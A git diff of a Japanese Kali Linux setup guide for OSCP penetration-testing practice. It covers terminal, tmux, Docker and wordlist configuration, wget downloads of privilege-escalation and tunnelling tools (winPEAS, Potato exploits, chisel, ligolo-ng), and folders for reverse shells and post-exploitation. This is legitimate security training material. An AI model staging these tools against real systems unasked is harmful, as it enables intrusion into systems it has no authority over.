@@ -1,289 +1,97 @@
+# Kali Setup
+
+## 仮想基盤とOSの基本
+
+| 項目 | 設定内容 |
+| --- | --- |
+| **プラットフォーム** | **VMware Workstation / Player** (公式推奨の安定性) |
+| **イメージ** | [Kali VMware 64-bit (Pre-built)](https://www.google.com/search?q=https://www.kali.org/get-kali/%23kali-virtual-machines) |
+| **基本設定** | RAM: 8GB推奨, CPU: 2コア以上, グラフィックメモリ: 2GB, 3Dアクセラレータあり **日本語フォント** (`fonts-noto-cjk`) |
+
+---
+
+## システムの基本更新と日本語化
+
+1. **システム更新:**
+```zsh
+# パッケージの更新と不要な依存関係の削除、キャッシュの整理を一括で行う
+sudo apt update && sudo apt full-upgrade -y && sudo apt autoremove -y && sudo apt autoclean -y
+```
+
+2. **日本語フォント（文字化け防止）**
+```zsh
+sudo apt install -y fonts-noto-cjk
+
+```
+
+3.  **電源管理（スリープ・ロック禁止）**
+
+長時間のスキャンを中断させないための必須設定です。
+
+```zsh
+gsettings set org.gnome.desktop.screensaver lock-enabled false
+gsettings set org.gnome.desktop.session idle-delay 0
+xset s off -dpms s noblank
+
+```
+
+4. **自動サスペンドOFF**
+
+```zsh
+sudo systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target
+```
+
+---
+
+## ディレクトリ構造の作成（整理のルール化）
+
+| カテゴリ   | ディレクトリパス                                                    | 用途                                  |
+| :----- | :---------------------------------------------------------- | :---------------------------------- |
+| **記録** | `~/Vault/Target/$ip/{assets,result,log}`                    | Obsidian管理。スクショ、Nmap結果、tmuxログ       |
+| **倉庫** | `~/Tools/{Git,Python,C#,Powershell,Bin}`                    | オリジナルツールの保管庫。ここからコピーして使う            |
+| **作業** | `~/Workbench/{Recon,AD,Web,Exploit,Wordlists,Verification}` | Kaliローカルで実行するツール群                   |
+| **配送** | `~/Transfer/{RevShell,PrivEsc,PostEx,Pivoting}`             | ターゲットへ送る用。内部に **Linux/Windows** を作成 |
 
 
-## 4. ツール管理とPython環境 (`pipx`)
+```zsh
+mkdir -p ~/Vault/Target \
+         ~/Tools/{Git,Python,C#,Powershell,Shell,Bin} \
+         ~/Workbench/{Recon,AD/enumeration,AD/attacks,Web/sqli,Exploit,Wordlists,Verification} \
+         ~/Transfer/{RevShell,PrivEsc,PostEx,Pivoting}/{Linux,Windows}
 
-システムを汚さず、どこからでもツールを呼び出せるようにします。
+# 確認用
+ls -R ~/Vault ~/Tools ~/Workbench ~/Transfer
 
-1. **pipxのセットアップ:**
+```
+
+---
+
+## pipxのインストール
+
 ```bash
 sudo apt install -y pipx && pipx ensurepath
 
 ```
 
-2. **便利なユーティリティ:**
-```bash
-# ペネトレーションテスト・実戦用ツールのインストール
-sudo apt install -y rlwrap netexec seclists curl enum4linux-ng \
-	flameshot rustscan
+## Docker
 
-```
+### インストール
 
-```bash
-# ターミナル・ユーティリティ・フォントのインストール
-sudo apt update
-sudo apt install -y kitty tmux zoxide fzf \
-    zsh-autosuggestions zsh-syntax-highlighting \
-    fonts-jetbrains-mono
-
-# Tmux プラグインマネージャー (TPM) の導入    
-git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
-
-# デフォルトターミナルの切り替え
-sudo update-alternatives --config x-terminal-emulator # Kittyを選択
-```
-
-3. **Git経由のインストール**
-
-* ***AutoRecon (推奨自動化ツール):**
-
-```bash
-# 依存関係のインストール後、pipx等でインストール
-sudo apt install -y seclists curl dnsrecon nbtscan nikto nmap onesixtyone oscanner smbclient smbmap sslscan ccze
-pipx install git+https://github.com/Tib3rius/AutoRecon.git
-
-```
-
-4. **Pythonツールのインストール:**
-* `pipx install impacket` (ネットワーク攻撃)
-* `pipx install updog` (アップロード対応HTTPサーバ)
-
-4. **Enumeration（列挙）の配置:**
-
-```bash
-# 保存用ディレクトリの作成
-mkdir -p ~/tools/scripts/windows/enumeration
-cd ~/tools/scripts/windows/enumeration
-
-# 1. Seatbelt (GhostPackの主力ツール)
-# ※ビルド済みのものを探すか、自身でビルドしたものを配置
-# 公式: https://github.com/GhostPack/Seatbelt
-# (OSCPでは最新のビルド済みバイナリを整理しておくのが定石です)
-
-# 2. SharpUp (特権昇格のチェックに特化したC#ツール)
-# ※ビルド済みのものを探すか、自身でビルドしたものを配置
-# https://github.com/GhostPack/SharpUp
-
-# 3. PowerUp.ps1 (PowerShellベースの定番)
-wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
-
-# 4. WinPEAS (列挙ツールの定番)
-wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe
-```
-
-```bash
-# 保存用ディレクトリの作成
-mkdir -p ~/tools/scripts/linux/enumeration
-cd ~/tools/scripts/linux/enumeration
-
-# 1. LinPEAS (最強の自動列挙スクリプト)
-wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
-
-# 2. Linux Exploit Suggester (カーネル脆弱性診断)
-wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
-
-# 3. pspy (プロセスのリアルタイム監視：cronジョブの特定に便利)
-# ※最近はバイナリ版を落としておくのが楽です
-wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
-```
-
-5. **PrivEsc（権限昇格）の配置:**
-
-```bash
-# 保存用ディレクトリの作成
-mkdir -p ~/tools/scripts/windows/privesc
-cd ~/oscp/scripts/windows/privesc
-
-# 1. Juicy Potato (Windows 2012/2016用)
-wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-
-# 2. Rogue Potato (Windows 2019 / Windows 10用)
-# ※リポジトリから最新のバイナリを取得
-wget https://github.com/antonioCoco/RoguePotato/releases/download/1.0/RoguePotato.zip
-
-# 3. PrintSpoofer (Juicyが効かない最新環境の定番)
-wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-
-# 4. GodPotato (最新の汎用Potato)
-wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-Net4.exe
-```
-
-1. **Pivoting/tunneling(トンネル・横展開)の配置:**
-
-```bash
-# 保存用ディレクトリ
-mkdir -p ~/tools/scripts/tunneling/chisel
-cd ~/oscp/scripts/tunneling/chisel
-
-# 最新リリースの取得 (Linux 64bit用とWindows 64bit用)
-# ※バージョン番号は適宜最新を確認してください
-wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
-wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
-
-# 解凍
-gunzip *.gz
-mv chisel_1.9.1_linux_amd64 chisel
-mv chisel_1.9.1_windows_amd64 chisel.exe
-chmod +x chisel
-
-# achiveを保管
-wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
-wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
-```
-
-```bash
-# 保存用ディレクトリ
-mkdir -p ~/tools/scripts/tunneling/ligolo
-cd ~/oscp/scripts/tunneling/ligolo
-
-# Proxy (Kali側) と Agent (ターゲット側) を取得
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
-wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip
-
-# 解凍して整理
-tar -xvf ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz proxy
-tar -xvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz agent
-unzip ligolo-ng_agent_0.5.2_windows_amd64.zip -d agent_win
-```
----
-
-## 5. ターミナル & マルチプレクサ & スクリーンショット設定
-
-
-
-
-
-### `~/.zshrc` エッセンス (自動化・効率化)
-
-
-```bash
-
-
-
-# --- 1. 情報更新ロジック (precmd) ---
-# プロンプトが表示される直前に、IP情報などを一括更新します
-refresh_oscp_prompt() {
-    # 自局IPの取得 (tun0優先)
-    local my_ip=$(ip -br -4 a show tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)
-    [ -z "$my_ip" ] && my_ip=$(ip -br -4 a show eth0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)
-    CURRENT_MY_IP="${my_ip:-N/A}"
-
-    # ターゲット情報の組み立て
-    if [ -n "$ip" ]; then
-        if [ -n "$fqdn" ]; then
-            TARGET_STATUS="%F{red}[T: $ip ($fqdn)]%f"
-        else
-            TARGET_STATUS="%F{red}[T: $ip]%f"
-        fi
-    else
-        TARGET_STATUS=""
-    fi
-}
-
-# zshのフックに登録
-autoload -Uz add-zsh-hook
-add-zsh-hook precmd refresh_oscp_prompt
-
-# --- 2. ターゲット設定関数 (改良版) ---
-target() {
-    if [ -z "$1" ]; then
-        echo "Usage: target <IP> [FQDN]"
-        return 1
-    fi
-
-    export ip="$1"
-    export target="$1"
-    unset fqdn # 前のターゲット情報をクリア
-    local tag="# TARGET"
-    
-    export workdir="$HOME/labs/$ip"
-    mkdir -p "$workdir"
-    cd "$workdir"
-
-    if [ -n "$2" ]; then
-        export fqdn="$2"
-        sudo sed -i "/ $fqdn/d; /^$ip /d" /etc/hosts
-        echo "$ip $fqdn $tag" | sudo tee -a /etc/hosts > /dev/null
-    fi
-
-    echo "[+] Target: $ip (${fqdn:-no fqdn})"
-    echo "[+] Switched to: $workdir"
-}
-
-target_clear() {
-    sudo sed -i "/# TARGET/d" /etc/hosts
-    unset ip target fqdn
-    echo "[!] Environment & Hosts cleared."
-}
-
-# --- 3. プロンプトの定義 ---
-setopt prompt_subst
-# 左側：[L: 自局IP] パス #
-PROMPT='%F{cyan}[L: ${CURRENT_MY_IP}]%f %F{blue}%~%f %# '
-# 右側：[T: 相手IP]
-RPROMPT='${TARGET_STATUS}'
-
-# Ligolo-ng の設定用 (TUNデバイス作成)
-setup_ligolo() {
-    sudo ip tuntap add user $USER mode tun ligolo
-    sudo ip link set ligolo up
-    echo "[+] TUN interface 'ligolo' is UP."
-}
-
-# Chisel サーバー起動 (Kali側で待機)
-alias chisel_srv='~/tools/scripts/tunneling/chisel/chisel server -p 8080 --reverse'
-
-# メンテナンス・便利エイリアス
-alias gclone='cd ~/tools/git && git clone'
-alias update-tools='find ~/tools/git -maxdepth 2 -name .git -type d -execdir git pull \;'
-alias pserv="python3 -m http.server 80"
-alias udot="updog -p 80"
-alias icat="kitty +kitten icat"
-# 自分のIPを簡潔に表示 (IPv4のみ)
-alias myip="ip -br -4 a"
-# VPNのIPだけを「値だけ」取り出す (よりシンプルに書けます)
-alias vpnip="ip -br -4 a show tun0 | awk '{print \$3}' | cut -d/ -f1"
-```
-
-以下に、Kali Linux への Docker / Docker Compose 導入手順を、実務で安定する形に整理してまとめます。
-
----
-
-# Kali Linux に Docker / Docker Compose を導入する手順（最適版）
-
-## ① システム更新
-
-```bash
+```zsh
+#  システム更新
 sudo apt update && sudo apt upgrade -y
-```
 
----
-
-## ② 必要パッケージ
-
-```bash
+# 必要パッケージ
 sudo apt install -y curl gnupg
-```
 
----
-
-## ③ Docker公式GPGキー登録
-
-```bash
+# Docker公式GPGキー登録
 sudo mkdir -p /etc/apt/keyrings
 curl -fsSL https://download.docker.com/linux/debian/gpg \
   | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
 
 sudo chmod a+r /etc/apt/keyrings/docker.gpg
-```
 
----
-
-## ④ Dockerリポジトリ追加（Kali対応）
-
-※ Debianコードネームを動的取得
-
-```bash
+# Dockerリポジトリ追加（Kali対応）
 . /etc/os-release
 
 echo "deb [arch=$(dpkg --print-architecture) \
@@ -291,49 +99,25 @@ signed-by=/etc/apt/keyrings/docker.gpg] \
 https://download.docker.com/linux/debian \
 $VERSION_CODENAME stable" \
 | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-```
 
----
-
-## ⑤ Docker / Compose インストール
-
-```bash
+# Docker / Compose インストール
 sudo apt update
 sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose-plugin
-```
 
----
-
-## ⑥ サービス起動
-
-```bash
+# サービス起動
 sudo systemctl enable --now docker
-```
 
----
-
-## ⑦ 動作確認
-
-```bash
+# 動作確認
 docker --version
 docker compose version
 docker run hello-world
-```
 
----
-
-## ⑧ sudoなしで実行（推奨）
-
-```bash
+# ## sudoなしで実行（推奨）
 sudo usermod -aG docker $USER
 newgrp docker
 ```
 
----
-
-# 補足（重要ポイント）
-
-## ■ Composeはv2が標準
+### Composeはv2が標準
 
 ```bash
 docker compose
@@ -343,7 +127,7 @@ docker compose
 
 ---
 
-## ■ docker.ioとの違い
+### docker.ioとの違い
 
 |パッケージ|特徴|
 |---|---|
@@ -353,10 +137,9 @@ docker compose
 → ペンテスト用途なら docker.io でも十分
 
 ---
+### よくあるトラブル
 
-## ■ よくあるトラブル
-
-### 権限エラー
+#### 権限エラー
 
 ```bash
 permission denied ...
@@ -366,7 +149,7 @@ permission denied ...
 
 ---
 
-### Dockerが起動しない
+#### Dockerが起動しない
 
 ```bash
 sudo systemctl restart docker
@@ -375,223 +158,766 @@ sudo systemctl status docker
 
 ---
 
-# 結論
+## ターミナルのカスタマイズ
 
-- 手順としては「Docker公式 + Kali対応（動的codename）」が最も安全
-    
-- Composeは `docker compose`（v2）を使用
-    
-- 権限設定と動作確認まで行えば実用環境として完成
-    
+### shellの確認
 
----
-
-必要なら次は：
-
-- ペンテスト用Docker環境（DVWA / Juice Shop）
-    
-- AutoReconのコンテナ化
-    
-- Burp Suite + ブラウザ分離構成
-    
-
-など、実践向けの構成も設計できます。
-
-その通りですね。`rockyou.txt` は Kali のデフォルト状態では `rockyou.txt.gz` として圧縮されているため、そのままではツールから読み込めません。
-
-また、`Passwords` や `Usernames` といった「自分で収集・加工したクレデンシャル」を別ディレクトリで変数化しておくのは、OSCPの試験中に「今使える有効なリストはどれか」を即座に判断するために非常に賢い選択です。
-
-これを踏まえて、`.zshrc` の定義とディレクトリ構造をより「実戦的」にアップデートしましょう。
-
----
-
-### 1. クレデンシャル専用の変数設定 (`.zshrc`)
-
-`Workbench/Wordlists` の下に、攻撃フェーズごとの変数を定義します。
-
-Bash
-
+shellの確認
+```zsh
+echo $SHELL
 ```
+
+#### bashだった場合 (/etc/passwdは/bin/zshに切り替わるがターミナルはbashのままだった)
+
+zshに切り替え(一時的)
+```zsh
+chsh -s /bin/zsh
+zsh
+```
+zshに切り替え(永続的)
+```zsh
+sudo chsh -s /bin/zsh kali
+sudo reboot
+```
+
+### ターミナルの変更
+
+```zsh
+sudo apt update
+sudo apt install kitty -y
+# Kitty を選択肢としてシステムに登録
+sudo update-alternatives --install /usr/bin/x-terminal-emulator x-terminal-emulator /usr/bin/kitty 50
+# 番号のリストが表示されるので、kitty の番号を入力して Enter
+sudo update-alternatives --config x-terminal-emulator
+```
+
+```zsh
+mkdir -p ~/.config/kitty
+cat << 'EOF' > ~/.config/kitty/kitty.conf
+# --- Shell Configuration ---
+# 確実にzshを起動させる
+shell /bin/zsh
+
+# --- Font Settings ---
+# OSCPでは長時間画面を見るため、視認性の高いフォントを推奨
+# (JetBrains Mono 等がインストールされていれば)
+font_family      JetBrainsMono Nerd Font
+font_size        11.0
+bold_font        auto
+italic_font      auto
+bold_italic_font auto
+
+# --- Window Layout ---
+# 画面の余白（少し空けると見やすくなります）
+window_padding_width 5
+# タブバーを上部に表示
+tab_bar_edge top
+tab_bar_style powerline
+
+# --- Color Scheme ---
+# 視認性の高いダークテーマ
+# background_opacity 0.92
+# background            #1e1e1e
+# foreground            #c5c8c6
+
+# ここでは目に優しい Gruvbox 系の色味を推奨
+foreground            #ebdbb2
+background            #282828
+selection_foreground  #282828
+selection_background  #ebdbb2
+
+# --- Scrollback ---
+# tmux側でも設定していますが、kitty側でも多めに確保
+scrollback_lines 20000
+
+# --- Terminal Bell ---
+# うるさいベル音をオフにする
+enable_audio_bell no
+visual_bell_duration 0.0
+
+# --- Performance ---
+# 入力遅延を最小限に
+input_delay 3
+repaint_delay 10
+sync_to_monitor yes
+
+# --- Keybindings ---
+# 選択しただけでクリップボードにコピーする(Tmuxにマウス制御を奪われる可能性あり。その場合Shiftキーを押しながら実施)
+copy_on_select yes
+
+# クリップボードとの同期
+strip_trailing_spaces smart
+
+# 右クリックで貼り付け（お好みで）
+# これを入れると、選択（左ドラッグ）→ 貼り付け（右クリック）で爆速になります
+mouse_map right click ungrabbed paste_from_clipboard
+
+# 矩形選択（ブロック選択）を Alt + マウスドラッグ で可能にする
+# IPアドレスの列だけを抜き出したい時などに便利です
+terminal_select_modifiers alt
+EOF
+```
+
+### shellの拡張機能のインストール
+
+#### **zoxide**
+
+```zsh
+sudo apt install zoxide
+# ~/.zshrcに反映（個別で実施する場合）
+# echo 'eval "$(zoxide init zsh)"' >> ~/.zshrc
+# source ~/.zshrc
+# 使い方: z oscp  (これで ~/Documents/OSCP/work/ に飛んだりできる)
+# ※一度移動する必要あり
+# 使い方: zi   fzf を使って、記憶されたディレクトリの一覧からインタラクティブに選択して移動
+```
+
+#### **fzf**
+
+```zsh
+sudo apt install fzf
+# ~/.zshrcに反映（個別で実施する場合）
+# echo 'source <(fzf --zsh)' >> ~/.zshrc
+# source ~/.zshrc
+# fzf のプレビュー機能を有効化（ファイルの中身を見ながら検索）
+export FZF_DEFAULT_OPTS="--height 40% --layout=reverse --border --preview 'cat {} | head -50'"
+# 履歴検索 (Ctrl+R) のときもプレビューを出す（打ったコマンドの全体像が見える）
+export FZF_CTRL_R_OPTS="--preview 'echo {}' --preview-window down:3:hidden:wrap --bind '?:toggle-preview'"
+# 使い方: Ctrl + R: コマンド履歴を検索
+# 使い方: Alt + C: フォルダ（ディレクトリ）を曖昧検索して移動
+```
+
+#### **Zshプラグイン:** `zsh-autosuggestions` と `zsh-syntax-highlighting` を有効化。
+
+```zsh
+sudo apt install zsh-autosuggestions
+sudo apt install zsh-syntax-highlighting
+# ~/.zshrcに反映（個別で実施する場合）
+# echo "source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh" >> ~/.zshrc
+# echo "source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" >> ~/.zshrc
+# source ~/.zshrc
+```
+
+#### ~/.zshrcの編集
+
+##### alias llとHISTSIZEとSAVEHISTの編集
+
+```zsh
+
+sed -i -e "s/^alias ll='ls -l'/alias ll='ls -alF'/" \
+       -e "s/^HISTSIZE=1000$/HISTSIZE=10000/" \
+       -e "s/^SAVEHIST=2000$/SAVEHIST=10000/" ~/.zshrc
+
+# 書き換え内容の確認
+grep -E "alias ll|HISTSIZE|SAVEHIST" ~/.zshrc
+
+# 設定の反映
+source ~/.zshrc
+```
+
+~/.zshrcに追記
+```zsh
+cat << 'EOF' >> ~/.zshrc
+# --- Strengthening of history management ---
+setopt HIST_IGNORE_ALL_DUPS  # 重複コマンドを記録しない
+setopt SHARE_HISTORY         # 複数のターミナル間で履歴を共有
+
+# --- Loading plugins (reading apt-installed ones) ---
+source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
+source /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
+source <(fzf --zsh)
+# うまくいかなかったときの代替え案
+# eval "$(fzf --zsh)"
+# [ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
+eval "$(zoxide init zsh)"
+# うまくいかなかったときの代替え案： z コマンドを有効化
+# eval "$(zoxide init zsh --cmd z)"
+
+# --- 1. 情報更新ロジック (precmd) ---
+# プロンプト表示の直前に実行され、変数 CURRENT_MY_IP と TARGET_STATUS を更新します
+refresh_oscp_prompt() {
+    # 自局IPの取得 (ip -br で高速化。tun0優先)
+    local my_ip=$(ip -br -4 a show tun0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)
+    [ -z "$my_ip" ] && my_ip=$(ip -br -4 a show eth0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)
+    CURRENT_MY_IP="${my_ip:-N/A}"
+
+    # ターゲット情報の組み立て (exportされた $TARGET_IP と $TARGET_NAME を利用)
+    if [ -n "$TARGET_IP" ]; then
+        if [ -n "$TARGET_NAME" ]; then
+            TARGET_STATUS="%F{red}[T: $TARGET_IP ($TARGET_NAME)]%f"
+        else
+            TARGET_STATUS="%F{red}[T: $TARGET_IP]%f"
+        fi
+    else
+        TARGET_STATUS=""
+    fi
+}
+
+# zshフックに登録
+autoload -Uz add-zsh-hook
+add-zsh-hook precmd refresh_oscp_prompt
+
+# --- 2. ターゲット管理関数 (Vault構造対応・改良版) ---
+target() {
+    local ip="$1"
+    local name="$2"
+    local vault_base="$HOME/Vault/Target"
+    local current_link="$vault_base/current_assets"
+
+    if [ -z "$ip" ]; then
+        export TARGET_IP=""
+        export TARGET_NAME=""
+        export SCREENSHOT_DIR=""
+        echo "ターゲット指定を解除しました。"
+        return
+    fi
+
+    # 1. ディレクトリ構造の作成
+    local target_dir="$vault_base/$ip"
+    mkdir -p "$target_dir/assets" "$target_dir/result" "$target_dir/log"
+
+    # 2. 変数設定 (プロンプトと共有)
+    export TARGET_IP="$ip"
+    export TARGET_NAME="$name"
+    export workdir="$target_dir" # ショートカット用
+    export TARGET_DIR="$target_dir"
+    export OUT="$target_dir/result"
+    export LOG="$target_dir/log"
+    export ASSETS="$target_dir/assets"
+    
+    # 3. /etc/hosts への追記 (タグ付きで一括管理)
+    local tag="# OSCP_TARGET"
+    if [ -n "$name" ]; then
+        sudo sed -i "/ $name/d; /^$ip /d" /etc/hosts
+        echo "$ip $name $tag" | sudo tee -a /etc/hosts > /dev/null
+    fi
+
+    # 4. シンボリックリンクの更新 (SS保存用)
+    ln -sfn "$target_dir/assets" "$current_link"
+    export SCREENSHOT_DIR="$current_link"
+
+    # 5. 移動
+    cd "$target_dir"
+
+    echo "----------------------------------------"
+    echo "🎯 Target Set & Moved to $target_dir"
+    echo "IP   : $TARGET_IP"
+    echo "FQDN : ${TARGET_NAME:-N/A}"
+    echo "----------------------------------------"
+}
+
+targetcl() {
+    sudo sed -i '/# OSCP_TARGET/d' /etc/hosts
+    export TARGET_IP=""
+    export TARGET_NAME=""
+    echo "[!] Target cleared."
+}
+
+# --- 3. プロンプトの定義 ---
+setopt prompt_subst
+# 左側：[L: 自分のIP] パス
+PROMPT='%F{cyan}[L: ${CURRENT_MY_IP}]%f %F{blue}%~%f %# '
+# 右側：[T: 相手のIP (FQDN)]
+RPROMPT='${TARGET_STATUS}'
+
+# --- 4. ツール・メンテナンス用エイリアス集 ---
+alias gup='find ~/Tools/Git -maxdepth 2 -name .git -type d -execdir git pull --rebase \;'
+alias maintenance='sudo apt update && sudo apt full-upgrade -y && gup && pipx upgrade-all'
+alias pserv="python3 -m http.server 80"
+alias udot="updog -p 80"
+alias icat="kitty +kitten icat"
+alias vpnip="ip -br -4 a show tun0 | awk '{print \$3}' | cut -d/ -f1"
+
+# 過去のターゲットのNmap結果などからキーワードを検索
+alias vault-grep='grep -r --color=always -E "$1" ~/Vault/Target/'
+
+# tmux ログを Obsidian へ整形して流し込む
+alias l2o='~/Tools/Bin/log2obsidian.sh'
+
 # --- Wordlists & Credentials Path ---
 export WORDLISTS="$HOME/Workbench/Wordlists"
 
 # 攻撃で見つけた「生きた」情報を格納する場所
 export USERS="$WORDLISTS/Usernames"
 export PASSES="$WORDLISTS/Passwords"
-export CREDS="$WORDLISTS/Credentials"  # user:pass のコンボリスト用
+export CREDS="$WORDLISTS/Credentials"  # user:pass のコンボリスト用
+export DISCOVERY="$WORDLISTS/Discovery"
 
 # 定番辞書へのショートカット（解凍後の rockyou をここに置く想定）
 export ROCKYOU="$WORDLISTS/Passwords/rockyou.txt"
 export SECLISTS="/usr/share/seclists"
 
 # エイリアス: 辞書ディレクトリへ一瞬で移動
+alias cdword='cd $WORDLISTS'
+alias cdusers='cd $USERS'
+alias cdpass='cd $PASSES'
 alias cdcreds='cd $CREDS'
+alias cddisc='cd $DISCOVERY'
+alias cdseclists='cd $SECLISTS'
+
+# Ligolo-ng / Chisel
+setup_ligolo() {
+    sudo ip tuntap add user $USER mode tun ligolo
+    sudo ip link set ligolo up
+    echo "[+] TUN interface 'ligolo' is UP."
+}
+alias chisel_srv='~/Tools/Bin/chisel server -p 8080 --reverse'
+EOF
 ```
 
----
+### **tmux**のインストール
 
-### 2. 推奨されるセットアップ手順
+```zsh
+sudo apt install tmux
+```
 
-`rockyou` の解凍とディレクトリ作成を一度に行うコマンドです。
+#### **Tmux プラグインマネージャー (TPM) の導入**
 
-Bash
+* **インストール:**
+
+```zsh
+git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm
+```
+
+#### `~/.tmux.conf` の作成
+
+```zsh
+cat << 'EOF' > ~/.tmux.conf
+# Set Tmux's default shell to Zsh
+set-option -g default-shell /bin/zsh
+
+# --- Basic Settings ---
+set -g mouse on               # マウス操作を有効化
+set -g history-limit 50000    # スクロール行数を5万行に
+set -g display-time 4000      # メッセージ表示時間を延長
+set -g status-interval 5      # 更新間隔
+
+# --- Keybinds ---
+# Split screen with | and - (current path is carried over)
+bind | split-window -h -c "#{pane_current_path}"
+bind - split-window -v -c "#{pane_current_path}"
+
+# Prefix + r で設定ファイルを再読み込みする
+bind r source-file ~/.tmux.conf \; display "Reloaded!"
+
+# Prefix + L で現在のターゲットディレクトリをログ保存先に再設定
+bind L run-shell "tmux set-environment -g @logging-path \"$HOME/Vault/Target/$TARGET_IP/log\"" \; display "Logging path updated to $TARGET_IP/log"
+
+# --- Prefix change (Ctrl + b -> Ctrl + a) ---
+set -g prefix C-a              # Main prefix is Ctrl+a
+unbind C-b                     # Disable default Ctrl+b
+bind C-a send-prefix           # Pressing Ctrl+a twice sends Ctrl+a to the program side.
+
+# --- Customizing the Status Bar ---
+set -g status-bg black
+set -g status-fg white
+set -g status-right "#[fg=green]#(echo $TARGET) #[fg=yellow]%H:%M:%S "
+
+# --- Automatic Logging (tmux-logging plugin) ---
+set -g @plugin 'tmux-plugins/tpm'
+set -g @plugin 'tmux-plugins/tmux-logging'
+
+# tmux-logging の保存先を Target/log に固定する設定
+set -g @logging-path "$HOME/Vault/Target/$TARGET_IP/log"
+# ※ただし、環境変数の同期が必要なため、手動で prefix + shift + p する際に
+# 現在のターゲットフォルダが作成されているか確認が必要です。
+
+# TPM initialization (must be placed at the end)
+run '~/.tmux/plugins/tpm/tpm'
+EOF
 
 ```
+
+#### **拡張機能の反映**
+
+**Tmux内で `Prefix (Ctrl+a)` -> `I` (大文字) を押すとインストール**
+
+## スクリーンショットのカスタマイズ
+
+### **flameshot**
+
+* **General**
+* Save image after copy
+
+* 保存ファイル名の自動化（超重要）
+
+  デフォルトでは `screenshot.png` のような名前になりますが、これを**「日時」**に変更することで、作業ログ（Obsidian等）との時系列が一致しやすくなります。
+
+  * **設定方法:** `Flameshot Config` > `Filename Editor`
+  * **おすすめ設定:** `%Y-%m-%d_%H-%M-%S`
+  * これで `2026-03-13_16-00-00.png` のように保存され、証拠の整理が劇的に楽になります。
+
+* インターフェースとツールの最適化
+
+  試験中は「矢印」と「ぼかし（隠蔽）」、「テキスト」を多用します。
+
+  * **UI設定:** `General` > `Show help message` をオフにする（邪魔なため）。
+  * **ボタンの選択:** `Interface` タブで、以下のツールだけを表示するように絞ると、ツールバーがスッキリします。
+    * **矢印 (Arrow):** 注目ポイントを指す。
+    * **矩形 (Rectanglar Selection):** 重要な文字列を囲む。
+    * **ぼかし (Pixelate):** VPNのIPやパスワードなど、報告書に載せたくない情報を隠す。
+    * **テキスト (Text):** 補足説明を入れる。
+    * **保存 (Save) & コピー (Copy to Clipboard):** クリップボードコピーをメインにするとObsidianへの貼り付けが速いです。
+
+* ショートカットキーの割り当て
+
+  OSCPでは「キャプチャを撮る」動作を何百回も繰り返します。マウス操作ではなくキーボード一発で起動させましょう。
+
+1. **起動確認:**
+ターミナルで `flameshot gui` を実行し、範囲選択ができるか確認します。
+2. **ショートカット登録 (重要):**
+Kaliの [Settings] > [Keyboard] > [Application Shortcuts] から、以下のショートカットを登録すると効率が劇的に上がります。
+* **Command:** `flameshot gui`
+* **Shortcut:** `Print` キー（または好みのキー）
+
+## Workbench
+
+### ~/Workbench/Wordlists
+
+```zsh
 # ディレクトリ作成
-mkdir -p ~/Workbench/Wordlists/{Usernames,Passwords,Credentials}
+mkdir -p ~/Workbench/Wordlists/{Discovery,Usernames,Passwords,Credentials}
 
 # rockyou をコピーして解凍（OS標準の場所を汚さない）
 cp /usr/share/wordlists/rockyou.txt.gz ~/Workbench/Wordlists/Passwords/
 gunzip ~/Workbench/Wordlists/Passwords/rockyou.txt.gz
 ```
 
+Kaliにプリインストールされている膨大なリストの中から、主要なものを選択
+
+```zsh
+# --- Discovery (Web列挙用) ---
+ln -sfn /usr/share/seclists/Discovery/Web-Content/common.txt $WORDLISTS/Discovery/common.txt
+ln -sfn /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt $WORDLISTS/Discovery/dir-medium.txt
+ln -sfn /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt $WORDLISTS/Discovery/raft-files.txt
+ln -sfn /usr/share/seclists/Usernames/top-usernames-shortlist.txt users.txt
+ln -sfn /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt raft-dir.txt
+
+# --- Usernames (ユーザー名列挙用) ---
+ln -sfn /usr/share/seclists/Usernames/top-usernames-shortlist.txt $WORDLISTS/Usernames/users-short.txt
+ln -sfn /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt $WORDLISTS/Usernames/users-10m.txt
+
+# --- Passwords (rockyou以外の補助) ---
